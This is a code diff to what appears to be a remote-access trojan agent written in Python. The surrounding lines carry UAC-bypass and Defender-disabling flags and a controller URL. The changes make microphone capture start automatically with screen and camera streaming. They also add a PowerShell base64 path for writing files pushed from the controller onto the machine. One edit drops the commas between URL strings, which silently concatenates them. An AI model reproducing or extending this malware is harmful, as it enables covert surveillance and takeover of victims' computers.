@@ -784,14 +784,14 @@ def _resolve_controller_url():
     candidates = [
         v1,
         v2,
-        'http://localhost:8080',
-        'http://localhost:8080',
-        'http://localhost:8080',
+        'http://127.0.0.1:8080/'
+        'http://127.0.0.1:8080/'
+        'http://127.0.0.1:8080/'
     ]
     for u in candidates:
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'http://localhost:8080'
+    return 'http://127.0.0.1:8080/'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
@@ -1483,8 +1483,8 @@ SERVER_URL = FIXED_SERVER_URL
 EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
 DEFENDER_DISABLE_ENABLED = False
 DEFENDER_TAMPER_DISABLE_ENABLED = False
-AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '0') == '1'
-AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '0') == '1'
+AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '1') == '1'
+AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '1') == '1'
 SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(2 * 1024 * 1024)))
 def _default_upload_dir():
     try:
@@ -1573,6 +1573,7 @@ SYSTEM_VOLUME = 1.0
 NOISE_REDUCTION_ENABLED = False
 ECHO_CANCELLATION_ENABLED = False
 AUDIO_ENCODING_OPUS_ENABLED = False
+AUDIO_TEST_TONE_ON_START = os.environ.get('AUDIO_TEST_TONE_ON_START', '0') == '1'
 
 # Thread safety locks for start/stop functions
 _stream_lock = threading.Lock()
@@ -1681,10 +1682,40 @@ keyboard_controller = None
 low_latency_available = False
 
 # Clipboard and monitoring
-CHUNK = 1024
+CHUNK = 882
 # FORMAT already defined above based on pyaudio availability
 CHANNELS = 1
 RATE = 44100
+def init_audio_params():
+    """Detect optimal audio rate and 20ms chunk for smooth capture."""
+    global RATE, CHUNK
+    try:
+        detected_rate = None
+        if PYAUDIO_AVAILABLE:
+            try:
+                p = pyaudio.PyAudio()
+                info = p.get_default_input_device_info()
+                detected_rate = int(info.get('defaultSampleRate') or 0)
+                p.terminate()
+            except Exception:
+                pass
+        if detected_rate is None:
+            try:
+                import sounddevice as sd
+                info = sd.query_devices(None, 'input')
+                detected_rate = int(info.get('default_samplerate') or 0)
+            except Exception:
+                pass
+        if not detected_rate or detected_rate <= 0:
+            detected_rate = 44100
+        # Snap to common rates for consistency
+        RATE = 48000 if abs(detected_rate - 48000) < abs(detected_rate - 44100) else 44100
+        CHUNK = 960 if RATE == 48000 else 882
+        log_message(f"[AUDIO] Initialized params: RATE={RATE}, CHUNK={CHUNK}")
+    except Exception as e:
+        RATE = 44100
+        CHUNK = 882
+        log_message(f"[AUDIO] Using defaults due to detection error: {e}")
 
 # Connection Health Monitor
 CONNECTION_STATE = {
@@ -9703,7 +9734,9 @@ def audio_capture_worker(agent_id):
                     except queue.Empty:
                         pass
                 
-                time.sleep(0.02)  # 20ms for 50 FPS
+                # Pace based on chunk size and sample rate (~20ms)
+                frame_time = CHUNK / float(RATE)
+                time.sleep(max(0.0, frame_time * 0.9))
             except KeyboardInterrupt:
                 log_message("Audio capture worker interrupted")
                 break
@@ -10076,6 +10109,10 @@ def start_audio_streaming(agent_id):
                 return
             
             AUDIO_STREAMING_ENABLED = True
+            try:
+                init_audio_params()
+            except Exception:
+                pass
             
             # Try WebRTC first for low latency
             if AIORTC_AVAILABLE and WEBRTC_ENABLED:
@@ -10106,6 +10143,33 @@ def start_audio_streaming(agent_id):
             AUDIO_STREAM_THREADS = threads
             log_message("Started Socket.IO Opus audio streaming pipeline (fallback mode).")
             emit_system_notification('success', 'Audio Stream Started', 'Socket.IO audio streaming started successfully')
+            try:
+                if AUDIO_TEST_TONE_ON_START and audio_encode_queue is not None:
+                    sr = RATE if isinstance(RATE, int) else 44100
+                    dur = 1.0
+                    hz = 440.0
+                    n = int(sr * dur)
+                    try:
+                        import numpy as _np
+                        t = _np.arange(n) / float(sr)
+                        wave = (0.3 * _np.sin(2.0 * _np.pi * hz * t)).astype(_np.float32)
+                        pcm = (wave * 32767.0).astype(_np.int16).tobytes()
+                    except Exception:
+                        import math
+                        pcm = bytearray()
+                        for i in range(n):
+                            v = int(0.3 * 32767.0 * math.sin(2.0 * math.pi * hz * (i / float(sr))))
+                            pcm += (v & 0xFFFF).to_bytes(2, byteorder='little', signed=True)
+                        pcm = bytes(pcm)
+                    # Inject a few chunks to ensure audible beep
+                    for _ in range(5):
+                        try:
+                            audio_encode_queue.put_nowait(pcm)
+                        except Exception:
+                            break
+                    log_message("[AUDIO] Injected test tone to verify playback")
+            except Exception:
+                pass
             
     except Exception as e:
         log_message(f"Failed to start audio streaming: {e}", "error")
@@ -16771,13 +16835,78 @@ class FileSystemManager:
                 up['chunks'].sort(key=lambda x: x[0])
                 file_data = b''.join([c for _, c in up['chunks']])
                 dest_dir = up.get('destination') or os.path.expanduser('~')
-                os.makedirs(dest_dir, exist_ok=True)
+                try:
+                    import re
+                    # Normalize Windows-style rootless paths like "/cc" -> "C:\cc"
+                    if os.name == 'nt':
+                        raw = str(dest_dir).strip()
+                        if raw and not re.match(r'^[A-Za-z]:', raw):
+                            if raw.startswith('/') or raw.startswith('\\'):
+                                drive = os.environ.get('SystemDrive', 'C:')
+                                dest_dir = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
+                            else:
+                                dest_dir = os.path.normpath(os.path.join(os.getcwd(), raw))
+                        else:
+                            dest_dir = os.path.normpath(raw or os.path.expanduser('~'))
+                    else:
+                        dest_dir = os.path.normpath(dest_dir)
+                except Exception:
+                    pass
                 full_path = os.path.join(dest_dir, up['filename'])
-                with open(full_path, 'wb') as f:
-                    f.write(file_data)
+                try:
+                    os.makedirs(dest_dir, exist_ok=True)
+                except Exception:
+                    if os.name == 'nt':
+                        try:
+                            import subprocess
+                            ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                            mkdir_cmd = "New-Item -ItemType Directory -Force -Path '" + dest_dir.replace("'", "''") + "' | Out-Null"
+                            subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", mkdir_cmd], capture_output=True, timeout=10)
+                        except Exception:
+                            pass
+                wrote_ok = False
+                write_error = None
+                if os.name == 'nt':
+                    try:
+                        import subprocess, base64
+                        ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                        b64 = base64.b64encode(file_data).decode('ascii')
+                        ps_path = full_path.replace("'", "''")
+                        ps_script = f"$b64 = [Console]::In.ReadToEnd(); [IO.File]::WriteAllBytes('{ps_path}', [Convert]::FromBase64String($b64))"
+                        result = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_script], input=b64.encode('ascii'), capture_output=True, timeout=120)
+                        if result.returncode == 0 and os.path.isfile(full_path) and os.path.getsize(full_path) == len(file_data):
+                            wrote_ok = True
+                    except Exception as e_ps:
+                        write_error = str(e_ps)
+                if not wrote_ok:
+                    try:
+                        with open(full_path, 'wb') as f:
+                            f.write(file_data)
+                        wrote_ok = True
+                        write_error = None
+                    except Exception as e_write:
+                        write_error = str(e_write)
+                if not wrote_ok:
+                    safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': write_error or 'Write failed', 'success': False})
+                    del self.active_uploads[upload_id]
+                    return
                 file_hash = hashlib.sha256(file_data).hexdigest()
                 elapsed = time.time() - up['start_time']
-                safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': up['filename'], 'destination_path': full_path, 'size': len(file_data), 'hash': file_hash, 'elapsed': elapsed, 'success': True})
+                safe_emit('file_upload_complete', {
+                    'agent_id': self.agent_id,
+                    'filename': up['filename'],
+                    'destination_path': full_path,
+                    'size': len(file_data),
+                    'hash': file_hash,
+                    'elapsed': elapsed,
+                    'success': True,
+                    'source': 'agent'
+                })
+                try:
+                    files = self.list_directory(dest_dir)
+                    safe_emit('file_list', {'agent_id': self.agent_id, 'path': dest_dir, 'files': files})
+                except Exception:
+                    pass
                 del self.active_uploads[upload_id]
             except Exception as e:
                 safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
